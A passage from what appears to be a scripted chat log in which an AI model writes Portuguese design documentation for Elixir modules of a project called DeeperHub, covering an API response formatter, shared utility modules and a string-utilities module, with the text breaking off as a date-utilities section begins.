### 6.2. `DeeperHub.Core.APIResponder.format_error(error_code :: atom() | String.t(), details :: term() | nil, user_message :: String.t() | nil) :: map()`

*   **Descri√ß√£o:** Formata uma resposta de erro gen√©rica.
*   **`error_code`:** Um c√≥digo de erro interno da aplica√ß√£o (ex: `:resource_not_found`, `\"AUTH_002\"`).
*   **`details`:** Informa√ß√µes t√©cnicas adicionais sobre o erro (evitar vazar dados sens√≠veis).
*   **`user_message`:** Mensagem amig√°vel para o usu√°rio. Se `nil`, uma mensagem padr√£o pode ser derivada do `error_code`.
*   **Retorno:** Mapa estruturado para erro (ex: `%{status: \"error\", error: %{code: error_code, message: user_message, details: details}}`).

### 6.3. `DeeperHub.Core.APIResponder.format_validation_error(errors :: map() | list(), user_message :: String.t() | nil) :: map()`

*   **Descri√ß√£o:** Formata uma resposta espec√≠fica para erros de valida√ß√£o.
*   **`errors`:** Mapa de erros (ex: `%{field_name: [\"error message\"]}`) ou lista de strings de erro.
*   **Retorno:** Mapa estruturado para erro de valida√ß√£o (ex: `%{status: \"error\", error: %{code: \"VALIDATION_ERROR\", message: user_message, fields: errors_map}}`).

### 6.4. `DeeperHub.Core.APIResponder.error_to_http_status(error_code :: atom() | String.t()) :: integer()`

*   **Descri√ß√£o:** Mapeia um c√≥digo de erro interno da aplica√ß√£o para um c√≥digo de status HTTP apropriado.
*   **Exemplo:** `:not_found` -> `404`, `:unauthenticated` -> `401`, `:unauthorized` -> `403`, `:validation_error` -> `422`, `:internal_server_error` -> `500`.

### 6.5. `DeeperHub.Core.APIResponder.encode(data :: term(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}` (Opcional)

*   **Descri√ß√£o:** Wrapper para `Jason.encode/2` com op√ß√µes padr√£o do sistema.

### 6.6. `DeeperHub.Core.APIResponder.decode(json_string :: String.t(), opts :: keyword()) :: {:ok, term()} | {:error, term()}` (Opcional)

*   **Descri√ß√£o:** Wrapper para `Jason.decode/2` com op√ß√µes padr√£o do sistema.

## ‚öôÔ∏è 7. Configura√ß√£o

Geralmente, este m√≥dulo tem poucas configura√ß√µes diretas, mas pode depender de:

*   `[:core, :api_responder, :default_error_message]` (String): Mensagem de erro padr√£o se nenhuma espec√≠fica for fornecida.
*   `[:core, :api_responder, :include_trace_id_in_errors]` (Boolean): Se o `trace_id` (de `DistributedTracing`) deve ser inclu√≠do automaticamente em respostas de erro para facilitar a correla√ß√£o. (Padr√£o: `false` para prod, `true` para dev).
*   `[:core, :internationalization, :default_locale]` (String): Usado se as mensagens de erro/sucesso forem traduzidas.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.Internationalization` (opcional): Se as mensagens forem traduzidas.
*   `DeeperHub.Core.ConfigManager` (opcional): Para obter configura√ß√µes de formata√ß√£o.

### 8.2. Bibliotecas Externas

*   `Jason` (ou outra biblioteca JSON): Se as fun√ß√µes `encode/decode` forem implementadas aqui. Caso contr√°rio, os controllers usariam `Jason` diretamente.

## ü§ù 9. Como Usar / Integra√ß√£o

Os controllers Phoenix s√£o os principais consumidores deste m√≥dulo.

**Exemplo em um Controller Phoenix:**
```elixir
defmodule DeeperHubWeb.API.V1.UserController do
  use DeeperHubWeb, :controller
  alias DeeperHub.Core.APIResponder
  alias DeeperHub.Accounts

  action_fallback DeeperHubWeb.API.FallbackController # Para tratamento centralizado de erros n√£o capturados

  def show(conn, %{\"id\" => id}) do
    case Accounts.get_user(id) do
      {:ok, nil} ->
        conn
        |> put_status(APIResponder.error_to_http_status(:not_found))
        |> json(APIResponder.format_error(:not_found, nil, \"Usu√°rio n√£o encontrado.\"))
      {:ok, user} ->
        # Poderia haver uma fun√ß√£o para transformar a struct User em um mapa seguro para API
        user_map_for_api = MyApp.UserView.render(\"show.json\", %{user: user}) 
        json(conn, APIResponder.format_success(user_map_for_api, \"Usu√°rio recuperado.\"))
      {:error, reason} ->
        conn
        |> put_status(APIResponder.error_to_http_status(:internal_error))
        |> json(APIResponder.format_error(:internal_error, reason, \"Erro ao buscar usu√°rio.\"))
    end
  end

  def create(conn, %{\"user\" => user_params}) do
    case Accounts.create_user(user_params) do
      {:ok, user} ->
        user_map_for_api = MyApp.UserView.render(\"show.json\", %{user: user})
        conn
        |> put_status(:created) # 201
        |> json(APIResponder.format_success(user_map_for_api, \"Usu√°rio criado com sucesso.\"))
      {:error, changeset} ->
        errors = Ecto.Changeset.traverse_errors(changeset, &MyAppWeb.ErrorHelpers.translate_error/1)
        conn
        |> put_status(APIResponder.error_to_http_status(:validation_error)) # 422
        |> json(APIResponder.format_validation_error(errors, \"Falha na valida√ß√£o.\"))
    end
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada fun√ß√£o de formata√ß√£o (`format_success`, `format_error`, `format_validation_error`) com diferentes inputs para garantir que a estrutura JSON de sa√≠da seja a esperada.
*   Testar a fun√ß√£o `error_to_http_status` com v√°rios c√≥digos de erro.
*   Se as fun√ß√µes `encode/decode` estiverem aqui, test√°-las.
*   Localiza√ß√£o: `test/deeper_hub/core/api_responder_test.exs`.

### 10.2. M√©tricas

Este m√≥dulo em si geralmente n√£o gera muitas m√©tricas, pois √© um utilit√°rio de formata√ß√£o. As m√©tricas relevantes (taxa de erro da API, status codes) seriam geradas pelo `DeeperHub.API` ou pelos Plugs de HTTP.

### 10.3. Logs

Normalmente, o `APIResponder` n√£o faz logging direto. Os controllers ou o `FallbackController` seriam respons√°veis por logar os erros antes de chamar o `APIResponder` para formatar a resposta.

### 10.4. Telemetria

N√£o aplic√°vel diretamente para um m√≥dulo de formata√ß√£o puro. A telemetria estaria associada ao ciclo de vida da requisi√ß√£o HTTP.

## ‚ùå 11. Tratamento de Erros

*   As fun√ß√µes de formata√ß√£o devem ser robustas e n√£o falhar mesmo com entradas inesperadas (ex: `nil` para `data` em `format_success`). Elas devem retornar uma estrutura de erro v√°lida ou uma representa√ß√£o padr√£o.
*   Falhas na codifica√ß√£o JSON (se feitas aqui) devem ser tratadas e logadas.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **N√£o Vazar Informa√ß√µes Sens√≠veis:** A principal considera√ß√£o √© garantir que as fun√ß√µes `format_error` e `format_validation_error` *n√£o* incluam informa√ß√µes sens√≠veis do sistema (como stack traces, queries SQL, ou valores de vari√°veis internas) nas respostas enviadas ao cliente em ambiente de produ√ß√£o. A chave `:details` em `format_error` deve ser usada com cautela.
*   **Consist√™ncia:** Manter a estrutura de resposta consistente ajuda a evitar que invasores tentem adivinhar informa√ß√µes com base em varia√ß√µes no formato de erro.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Mantenha a estrutura de resposta JSON bem definida e documentada.
*   Ao adicionar novos c√≥digos de erro internos, atualize `error_to_http_status/1` se necess√°rio.
*   Considere a internacionaliza√ß√£o das mensagens de usu√°rio.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar suporte mais expl√≠cito para o padr√£o JSON:API se for uma dire√ß√£o desejada para a API.
*   [ ] Integrar mais profundamente com `DeeperHub.Core.Internationalization` para que `user_message` possa ser um c√≥digo de tradu√ß√£o.
*   [ ] Fornecer uma maneira de configurar a estrutura de resposta padr√£o (ex: chaves `status`, `data`, `error`) atrav√©s do `ConfigManager` para maior flexibilidade.
*   [ ] Criar helpers Phoenix para os controllers que combinem a formata√ß√£o da resposta e o envio da mesma (ex: `respond_success(conn, data, status_code \\\\ 200)`).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo √© mais um utilit√°rio, mas fundamental para a experi√™ncia do desenvolvedor que consome a API.

Pr√≥ximo? Que tal `DeeperHub.Shared.Utils` para agruparmos os utilit√°rios gerais, ou prefere um m√≥dulo de dom√≠nio como `DeeperHub.Accounts` (que j√° come√ßamos) ou `DeeperHub.UserProfiles` (mencionado na documenta√ß√£o original)?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos agrupar e detalhar os utilit√°rios gen√©ricos que podem ser usados em toda a aplica√ß√£o sob um namespace `DeeperHub.Shared.Utils`. A documenta√ß√£o original listou v√°rios (`DateUtils`, `FileUtils`, `ListUtils`, `MapUtils`, `SecurityUtils`, `StringUtils`, `ValidationUtils`).

Criaremos um README \"guarda-chuva\" para `DeeperHub.Shared.Utils` e, em seguida, podemos detalhar cada um deles como se fossem subm√≥dulos ou arquivos dentro desse contexto. Para este exerc√≠cio, vou criar um README para o m√≥dulo `DeeperHub.Shared.Utils` como um todo, mencionando seus componentes, e depois detalhar um deles, por exemplo, `DeeperHub.Shared.Utils.StringUtils`.

---

# M√≥dulo: `DeeperHub.Shared.Utils` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Shared.Utils`

O m√≥dulo (ou namespace) `DeeperHub.Shared.Utils` agrupa um conjunto de **m√≥dulos utilit√°rios gen√©ricos** que fornecem fun√ß√µes auxiliares para tarefas comuns em todo o sistema DeeperHub. Essas fun√ß√µes n√£o pertencem a um dom√≠nio de neg√≥cio espec√≠fico, mas oferecem funcionalidades reutiliz√°veis para manipula√ß√£o de strings, datas, listas, mapas, arquivos, valida√ß√µes b√°sicas e opera√ß√µes de seguran√ßa comuns.

O objetivo √© evitar a duplica√ß√£o de c√≥digo, promover a consist√™ncia e fornecer um local centralizado para funcionalidades de baixo n√≠vel que s√£o amplamente utilizadas. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave (por Subm√≥dulo)

Este namespace normalmente cont√©m v√°rios m√≥dulos menores, cada um com um foco espec√≠fico:

*   **`DeeperHub.Shared.Utils.StringUtils`:**
    *   Manipula√ß√£o de strings: convers√£o de case (camelCase, snake_case), truncamento, mascaramento de IDs, gera√ß√£o de IDs/tokens simples, formata√ß√£o para logs.
*   **`DeeperHub.Shared.Utils.DateUtils`:**
    *   Manipula√ß√£o de datas e horas: adi√ß√£o/subtra√ß√£o de tempo, c√°lculo de diferen√ßas, formata√ß√£o, verifica√ß√£o de intervalos.
*   **`DeeperHub.Shared.Utils.ListUtils`:**
    *   Opera√ß√µes em listas: chunking, diff, group_by, interleave, pagina√ß√£o em mem√≥ria, particionamento, ordena√ß√£o por m√∫ltiplas chaves, remo√ß√£o de duplicatas.
*   **`DeeperHub.Shared.Utils.MapUtils`:**
    *   Opera√ß√µes em mapas: convers√£o de chaves (√°tomo/string), compacta√ß√£o (remo√ß√£o de nils), mesclagem profunda, filtragem, acesso/atualiza√ß√£o aninhada.
*   **`DeeperHub.Shared.Utils.FileUtils` (se a aplica√ß√£o lida diretamente com o sistema de arquivos):**
    *   Opera√ß√µes de arquivo: verifica√ß√£o de exist√™ncia, leitura, escrita, c√≥pia, c√°lculo de hash, obten√ß√£o de MIME type.
*   **`DeeperHub.Shared.Utils.ValidationUtils`:**
    *   Fun√ß√µes de valida√ß√£o de formato para dados comuns: email, telefone, URL, data, n√∫mero de documento, JSON.
    *   Valida√ß√£o de complexidade de senha (b√°sica), presen√ßa de campos obrigat√≥rios.
    *(Nota: Valida√ß√µes mais complexas ou espec√≠ficas de dom√≠nio residiriam nos respectivos m√≥dulos ou em `Core.InputValidator`)*
*   **`DeeperHub.Shared.Utils.SecurityUtils`:**
    *   Utilit√°rios de seguran√ßa gen√©ricos e agn√≥sticos de contexto: gera√ß√£o de tokens/IDs aleat√≥rios seguros, hashing de senhas (se n√£o centralizado em `Auth` ou `Core.EncryptionService`), avalia√ß√£o de risco simples baseada em fatores.
    *(Nota: Fun√ß√µes criptogr√°ficas mais robustas e gerenciamento de chaves devem estar em `Core.EncryptionService`)*

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

Cada subm√≥dulo dentro de `DeeperHub.Shared.Utils` √© tipicamente um **m√≥dulo funcional puro**, contendo apenas fun√ß√µes que recebem entradas e produzem sa√≠das sem efeitos colaterais (ou com efeitos colaterais bem definidos, como no caso de `FileUtils`). Eles geralmente n√£o mant√™m estado nem s√£o GenServers.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/shared/utils/
‚îú‚îÄ‚îÄ string_utils.ex
‚îú‚îÄ‚îÄ date_utils.ex
‚îú‚îÄ‚îÄ list_utils.ex
‚îú‚îÄ‚îÄ map_utils.ex
‚îú‚îÄ‚îÄ file_utils.ex       # Se aplic√°vel
‚îú‚îÄ‚îÄ validation_utils.ex
‚îî‚îÄ‚îÄ security_utils.ex
```
O arquivo `lib/deeper_hub/shared/utils.ex` poderia ser um arquivo vazio ou um m√≥dulo que simplesmente agrupa aliases ou documenta√ß√£o de alto n√≠vel para os subm√≥dulos.

### 3.3. Decis√µes de Design Importantes

*   **Sem Estado:** Os m√≥dulos utilit√°rios devem ser, na medida do poss√≠vel, stateless.
*   **Fun√ß√µes Puras:** Preferir fun√ß√µes puras para facilitar o teste e o racioc√≠nio sobre o c√≥digo.
*   **Sem Depend√™ncias de Dom√≠nio:** Utilit√°rios n√£o devem depender de m√≥dulos de dom√≠nio espec√≠ficos (ex: `DeeperHub.Accounts`). Se uma fun√ß√£o precisa de l√≥gica de dom√≠nio, ela provavelmente pertence ao m√≥dulo de dom√≠nio.
*   **Generalidade:** As fun√ß√µes devem ser gen√©ricas o suficiente para serem √∫teis em m√∫ltiplos contextos.
*   **Clareza vs. Performance:** Embora a performance seja importante, a clareza e a corre√ß√£o das fun√ß√µes utilit√°rias s√£o primordiais. Otimiza√ß√µes podem ser feitas se um utilit√°rio espec√≠fico se tornar um gargalo.

## üõ†Ô∏è 4. Casos de Uso Principais (Exemplos de cada Subm√≥dulo)

*   **`StringUtils.camel_to_snake(\"myExampleVariable\")`** -> `\"my_example_variable\"`
*   **`DateUtils.add(~N[2023-01-01 10:00:00], 5, :day)`** -> `~N[2023-01-06 10:00:00]`
*   **`ListUtils.chunk([1,2,3,4,5], 2)`** -> `[[1,2], [3,4], [5]]`
*   **`MapUtils.deep_merge(%{a: 1, b: %{c: 2}}, %{b: %{d: 3}, e: 4})`** -> `%{a: 1, b: %{c: 2, d: 3}, e: 4}`
*   **`ValidationUtils.validate_email(\"test@example.com\")`** -> `true` (ou `{:ok, \"test@example.com\"}`)
*   **`SecurityUtils.generate_token(16, :hex)`** -> Uma string hexadecimal de 32 caracteres.

## üåä 5. Fluxos Importantes

N√£o aplic√°vel no mesmo sentido que m√≥dulos com estado ou processos. O fluxo √© simplesmente a chamada de uma fun√ß√£o e o retorno de seu resultado.

## üì° 6. API (Fun√ß√µes P√∫blicas dos Subm√≥dulos)

A API consiste nas fun√ß√µes p√∫blicas exportadas por cada subm√≥dulo utilit√°rio (ex: `StringUtils.truncate/3`, `MapUtils.get_in_path/3`). A documenta√ß√£o espec√≠fica de cada API residiria nos arquivos README de seus respectivos subm√≥dulos ou diretamente como documenta√ß√£o de fun√ß√£o `@doc` / `@spec`.

## ‚öôÔ∏è 7. Configura√ß√£o

Geralmente, m√≥dulos utilit√°rios puros n√£o requerem muita configura√ß√£o externa via `ConfigManager`, a menos que tenham comportamentos padr√£o que precisem ser ajust√°veis (ex: o caractere de mascaramento padr√£o em `StringUtils.mask_id/3`).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

Idealmente, os m√≥dulos em `Shared.Utils` t√™m poucas ou nenhuma depend√™ncia de outros m√≥dulos `DeeperHub`, exceto talvez `Core.ConfigManager` para padr√µes configur√°veis. Eles s√£o blocos de constru√ß√£o.

### 8.2. Bibliotecas Externas

Podem usar bibliotecas Elixir/Erlang padr√£o para suas funcionalidades (ex: `String`, `Enum`, `Map`, `DateTime`, `:crypto`). Em alguns casos, uma pequena biblioteca de terceiros altamente focada pode ser usada se fornecer uma funcionalidade utilit√°ria robusta que n√£o valha a pena reinventar (ex: uma biblioteca para parsing de User-Agent mais avan√ßado, se isso for colocado em `Utils` em vez de um servi√ßo dedicado).

## ü§ù 9. Como Usar / Integra√ß√£o

Os m√≥dulos utilit√°rios s√£o importados ou aliasados e suas fun√ß√µes s√£o chamadas diretamente onde necess√°rio.

```elixir
defmodule MyApp.SomeService do
  alias DeeperHub.Shared.Utils.StringUtils
  alias DeeperHub.Shared.Utils.DateUtils

  def process_text(text) do
    truncated = StringUtils.truncate(text, 100)
    # ...
  end

  def get_expiry_date(start_date) do
    DateUtils.add(start_date, 30, :day)
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Cada fun√ß√£o utilit√°ria deve ter testes unit√°rios abrangentes cobrindo casos de borda, entradas v√°lidas e inv√°lidas.
*   Testes baseados em propriedades (Property-based testing com StreamData) podem ser muito √∫teis para fun√ß√µes utilit√°rias que processam dados.
*   Localiza√ß√£o: `test/deeper_hub/shared/utils/<submodule_name>_test.exs`.

### 10.2. M√©tricas

Geralmente, fun√ß√µes utilit√°rias puras n√£o emitem m√©tricas por si mesmas. Se uma fun√ß√£o utilit√°ria for identificada como um gargalo de performance em um caminho cr√≠tico, o chamador dessa fun√ß√£o seria respons√°vel por adicionar m√©tricas de timing ao redor da chamada.

### 10.3. Logs

Fun√ß√µes utilit√°rias puras geralmente n√£o devem fazer logging. Se ocorrer um erro inesperado dentro de uma fun√ß√£o utilit√°ria (o que deveria ser raro se as entradas forem validadas pelos chamadores ou pela pr√≥pria fun√ß√£o), ela pode levantar uma exce√ß√£o que ser√° capturada e logada pelo chamador.

### 10.4. Telemetria

Similar √†s m√©tricas, fun√ß√µes utilit√°rias puras n√£o emitem eventos Telemetry. A instrumenta√ß√£o Telemetry ocorreria no c√≥digo que as utiliza.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes utilit√°rias devem ter um contrato claro sobre como lidam com entradas inv√°lidas:
    *   Algumas podem levantar exce√ß√µes (ex: `ArgumentError`).
    *   Outras podem retornar tuplas de erro (ex: `{:error, :invalid_format}`).
    *   Outras podem retornar um valor padr√£o ou `nil`.
*   A documenta√ß√£o de cada fun√ß√£o deve ser clara sobre seu comportamento em caso de erro.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **`SecurityUtils`:** As fun√ß√µes aqui devem ser revisadas cuidadosamente para garantir que sejam criptograficamente seguras (ex: uso correto de `:crypto.strong_rand_bytes/1`).
*   **`ValidationUtils` e `StringUtils` (Sanitiza√ß√£o):** Se alguma fun√ß√£o aqui realizar sanitiza√ß√£o, ela deve ser robusta contra bypass. No entanto, a sanitiza√ß√£o principal para XSS, SQLi, etc., reside nos m√≥dulos de seguran√ßa dedicados (`XssProtection`, `SqlInjectionProtection`). Os utilit√°rios podem fornecer blocos de constru√ß√£o b√°sicos para essas opera√ß√µes.
*   **`FileUtils`:** Se interagir com o sistema de arquivos, deve ser extremamente cuidadoso para n√£o introduzir vulnerabilidades de Path Traversal (essa prote√ß√£o principal estaria em `PathTraversalProtection`, mas `FileUtils` deve ser consciente).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar uma nova fun√ß√£o utilit√°ria, certifique-se de que ela seja gen√©rica e reutiliz√°vel.
*   Adicione documenta√ß√£o clara (`@doc`, `@spec`) e testes unit√°rios completos.
*   Evite adicionar depend√™ncias desnecess√°rias a outros m√≥dulos do DeeperHub.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Para cada subm√≥dulo (`StringUtils`, `DateUtils`, etc.), criar um arquivo README.md espec√≠fico detalhando sua API.
*   [ ] Avaliar se alguma funcionalidade em `Utils` se tornou complexa o suficiente para justificar seu pr√≥prio servi√ßo/m√≥dulo Core.
*   [ ] Adicionar mais utilit√°rios conforme a necessidade surgir (ex: `NumberUtils` para formata√ß√£o de moeda, `EnumUtils` para opera√ß√µes avan√ßadas em enumera√ß√µes).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Agora, vamos detalhar um desses subm√≥dulos. Que tal o `DeeperHub.Shared.Utils.StringUtils`?

---

# M√≥dulo: `DeeperHub.Shared.Utils.StringUtils` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Shared.Utils.StringUtils`

O m√≥dulo `DeeperHub.Shared.Utils.StringUtils` fornece um conjunto de fun√ß√µes utilit√°rias para **manipula√ß√£o e formata√ß√£o de strings**. Estas fun√ß√µes s√£o gen√©ricas e projetadas para serem usadas em v√°rias partes do sistema DeeperHub para tarefas comuns como convers√£o de case, truncamento, mascaramento de IDs, e gera√ß√£o de identificadores simples. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Convers√£o de Case:**
    *   Converter strings entre `snake_case` e `camelCase` (`camel_to_snake/1`, `snake_to_camel/1`).
*   **Truncamento de Texto:**
    *   Limitar o comprimento de uma string, adicionando um sufixo se truncada (`truncate/3`).
*   **Mascaramento de IDs/Dados Sens√≠veis:**
    *   Ocultar parcialmente uma string (ex: um ID ou n√∫mero), deixando apenas alguns caracteres vis√≠veis (`mask_id/3`).
*   **Gera√ß√£o de Identificadores Simples:**
    *   Gerar strings de ID aleat√≥rias, possivelmente com um prefixo (`generate_id/1`). (Nota: Para IDs criptograficamente seguros ou UUIDs, usar `DeeperHub.Shared.Utils.SecurityUtils` ou `UUID`).
*   **Formata√ß√£o para Logs:**
    *   Formatar/truncar texto para exibi√ß√£o segura e concisa em logs (`format_for_log/2`).
*   **Outras Manipula√ß√µes Comuns:**
    *   Remo√ß√£o de acentos.
    *   Gera√ß√£o de \"slugs\" a partir de t√≠tulos.
    *   Capitaliza√ß√£o.

## üèóÔ∏è 3. Arquitetura e Design

Este √© um m√≥dulo puramente funcional, n√£o gerenciando estado.

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.StringUtils` (M√≥dulo Funcional):** Cont√©m todas as fun√ß√µes de utilidade para strings.

### 3.2. Estrutura de Diret√≥rios

```
lib/deeper_hub/shared/utils/string_utils.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Imutabilidade:** Todas as fun√ß√µes retornam novas strings, n√£o modificando as originais.
*   **Tratamento de `nil`:** Fun√ß√µes devem lidar graciosamente com entradas `nil` (ex: retornando `nil`, string vazia, ou levantando `ArgumentError` conforme documentado).
*   **Unicode:** As fun√ß√µes devem ser seguras para uso com strings UTF-8.

## üõ†Ô∏è 4. Casos de Uso Principais

*   Converter chaves de API de `snake_case` (Elixir) para `camelCase` (JSON) e vice-versa.
*   Exibir uma pr√©via de um texto longo em uma UI, usando `truncate/3`.
*   Mostrar um ID de transa√ß√£o parcialmente mascarado em um extrato: `mask_id(\"txn_abcdef123456\", 4)`.
*   Gerar um ID de refer√™ncia simples para um log: `generate_id(\"logref_\")`.

## üåä 5. Fluxos Importantes

N√£o aplic√°vel (m√≥dulo funcional).

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

### 6.1. `DeeperHub.Shared.Utils.StringUtils.camel_to_snake(string :: String.t()) :: String.t()`

*   **Descri√ß√£o:** Converte uma string em `camelCase` ou `PascalCase` para `snake_case`.
*   **Exemplo:** `camel_to_snake(\"UserProfile\")` -> `\"user_profile\"`

### 6.2. `DeeperHub.Shared.Utils.StringUtils.snake_to_camel(string :: String.t(), capitalize_first_letter :: boolean() \\\\ false) :: String.t()`

*   **Descri√ß√£o:** Converte uma string em `snake_case` para `camelCase`. Se `capitalize_first_letter` for `true`, converte para `PascalCase`.
*   **Exemplo:** `snake_to_camel(\"user_profile_id\")` -> `\"userProfileId\"`, `snake_to_camel(\"user_profile\", true)` -> `\"UserProfile\"`

### 6.3. `DeeperHub.Shared.Utils.StringUtils.truncate(string :: String.t() | nil, max_length :: non_neg_integer(), suffix :: String.t() \\\\ \"...\") :: String.t() | nil`

*   **Descri√ß√£o:** Trunca `string` para `max_length` se for maior, anexando `suffix`. Retorna `nil` se a entrada for `nil`.
*   **Exemplo:** `truncate(\"Texto muito longo\", 10)` -> `\"Texto m...\"`

### 6.4. `DeeperHub.Shared.Utils.StringUtils.mask_id(id_string :: String.t() | nil, visible_end_chars :: non_neg_integer(), mask_char :: String.t() \\\\ \"*\") :: String.t() | nil`

*   **Descri√ß√£o:** Mascara o in√≠cio de `id_string`, deixando `visible_end_chars` vis√≠veis no final.
*   **Exemplo:** `mask_id(\"abcdef123456\", 4)` -> `\"********3456\"`

### 6.5. `DeeperHub.Shared.Utils.StringUtils.generate_id(prefix :: String.t() \\\\ \"\", length :: non_neg_integer() \\\\ 16) :: String.t()` (Nova Sugest√£o - para IDs n√£o cripto)

*   **Descri√ß√£o:** Gera uma string alfanum√©rica aleat√≥ria de `length` caracteres, prefixada por `prefix`. *N√£o usar para segredos ou tokens de seguran√ßa.*
*   **Exemplo:** `generate_id(\"ref_\", 8)` -> `\"ref_aB3x7pQk\"`

### 6.6. `DeeperHub.Shared.Utils.StringUtils.format_for_log(text :: String.t() | nil, max_length :: non_neg_integer() \\\\ 200) :: String.t() | nil`

*   **Descri√ß√£o:** Trunca `text` para `max_length` (para logs) e substitui m√∫ltiplos espa√ßos/novas linhas por um √∫nico espa√ßo.
*   **Exemplo:** `format_for_log(\"Log \\n com \\t muitas \\s\\s linhas\", 50)` -> `\"Log com muitas linhas\"`

### 6.7. `DeeperHub.Shared.Utils.StringUtils.slugify(string :: String.t(), separator :: String.t() \\\\ \"-\") :: String.t()` (Nova Sugest√£o)

*   **Descri√ß√£o:** Converte uma string em um \"slug\" amig√°vel para URL (min√∫sculas, remove acentos, substitui espa√ßos e caracteres especiais por `separator`).
*   **Exemplo:** `slugify(\"T√≠tulo do Meu Post!\")` -> `\"titulo-do-meu-post\"`

### 6.8. `DeeperHub.Shared.Utils.StringUtils.humanize(string :: String.t()) :: String.t()` (Nova Sugest√£o)

*   **Descri√ß√£o:** Converte uma string `snake_case` ou `camelCase` em uma frase leg√≠vel por humanos (capitaliza a primeira letra, substitui `_` por espa√ßo).
*   **Exemplo:** `humanize(\"user_profile_updated\")` -> `\"User profile updated\"`

## ‚öôÔ∏è 7. Configura√ß√£o

Este m√≥dulo geralmente n√£o requer configura√ß√µes externas, mas alguns padr√µes poderiam ser configur√°veis se necess√°rio:
*   Default `max_length` ou `suffix` para `truncate/3`.
*   Default `mask_char` para `mask_id/3`.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   Nenhuma.

### 8.2. Bibliotecas Externas

*   Pode usar `Slugify` se a fun√ß√£o `slugify/2` for complexa.
*   Pode usar `Unaccent` para remo√ß√£o de acentos.
*   Geralmente, usa apenas fun√ß√µes do m√≥dulo `String` e `:binary` do Elixir/Erlang.

## ü§ù 9. Como Usar / Integra√ß√£o

Simplesmente chame as fun√ß√µes do m√≥dulo onde a manipula√ß√£o de string for necess√°ria.
```elixir
alias DeeperHub.Shared.Utils.StringUtils

short_desc = StringUtils.truncate(long_description, 150)
api_key_masked = StringUtils.mask_id(api_key, 6)
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unit√°rios para cada fun√ß√£o com uma variedade de entradas, incluindo strings vazias, `nil`, strings com caracteres Unicode, e casos de borda para `truncate` e `mask_id`.
*   Localiza√ß√£o: `test/deeper_hub/shared/utils/string_utils_test.exs`.

### 10.2. M√©tricas / 10.3. Logs / 10.4. Telemetria

N√£o aplic√°vel para um m√≥dulo de utilit√°rios puros.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes devem ser claras sobre como lidam com `nil` ou entradas inv√°lidas (retornar `nil`, string vazia, ou levantar `ArgumentError`). Isso deve ser documentado por fun√ß√£o.
*   Para `truncate` e `mask_id`, se `max_length` ou `visible_end_chars` for maior que o comprimento da string, a string original deve ser retornada.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   As fun√ß√µes de mascaramento (`mask_id`) s√£o para exibi√ß√£o e n√£o devem ser consideradas uma forma de criptografia ou hashing seguro.
*   A fun√ß√£o `generate_id` n√£o √© para tokens de seguran√ßa; use `:crypto.strong_rand_bytes/1` e codifica√ß√£o (ou `SecurityUtils`) para isso.
*   A fun√ß√£o `slugify` deve garantir que o resultado n√£o contenha caracteres que possam ser problem√°ticos em URLs ou nomes de arquivo.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Adicione novas fun√ß√µes apenas se forem verdadeiramente gen√©ricas e reutiliz√°veis.
*   Mantenha as fun√ß√µes focadas e com comportamento previs√≠vel.
*   Adicione testes para todas as novas fun√ß√µes e para casos de borda de fun√ß√µes existentes.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar mais fun√ß√µes de manipula√ß√£o de string comuns (ex: `strip_tags` mais robusto, `word_wrap`).
*   [ ] Melhorar o suporte Unicode em todas as fun√ß√µes, especialmente `slugify` e `humanize`.
*   [ ] Considerar a performance para fun√ß√µes que podem ser chamadas em loops com strings grandes.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este detalha o `StringUtils`. Podemos seguir com outro m√≥dulo `Utils` como `DateUtils` ou `MapUtils`, ou voltar para um m√≥dulo Core ou de Seguran√ßa?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""√ìtimo! Vamos continuar com os utilit√°rios e detalhar o `DeeperHub.Shared.Utils.DateUtils`. A manipula√ß√£o de datas e horas √© uma necessidade comum em muitas partes de um sistema.

---

# M√≥dulo: `DeeperHub.Shared.Utils.DateUtils` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Shared.Utils.DateUtils`

